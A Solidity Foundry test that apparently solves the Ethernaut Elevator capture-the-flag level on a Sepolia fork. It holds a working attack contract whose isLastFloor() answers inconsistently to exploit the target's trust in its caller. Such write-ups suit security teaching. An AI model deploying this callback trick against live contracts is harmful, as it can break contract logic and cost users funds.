// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";
import "../src/levels/11-Elevator/Elevator.sol";

contract ContractTest is Test {
    AttackElevator attackContract;
    Elevator level11 =
        Elevator(payable(0x1815288bBA981c5bC13bd85e5D3F16437Bf8eFE6));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x1815288bBA981c5bC13bd85e5D3F16437Bf8eFE6),
            "Ethernaut11"
        );
        attackContract = new AttackElevator();
    }

    function testEthernaut11() public {
        attackContract.goTo(1);
        assert(level11.top() == true);
    }

    receive() external payable {}
}

// The attack contract abuse an issue from the source code
// Building building = Building(msg.sender);
// This allows the attacker creates a contract and customized the isLastFloor() function

contract AttackElevator {
    Elevator level11 =
        Elevator(payable(0x1815288bBA981c5bC13bd85e5D3F16437Bf8eFE6));
    uint256 counter = 0;

    function goTo(uint256 _floor) public {
        level11.goTo(_floor);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (counter == 0) {
            counter += 1;
            return false;
        } else {
            counter = 0;
            return true;
        }
    }
}
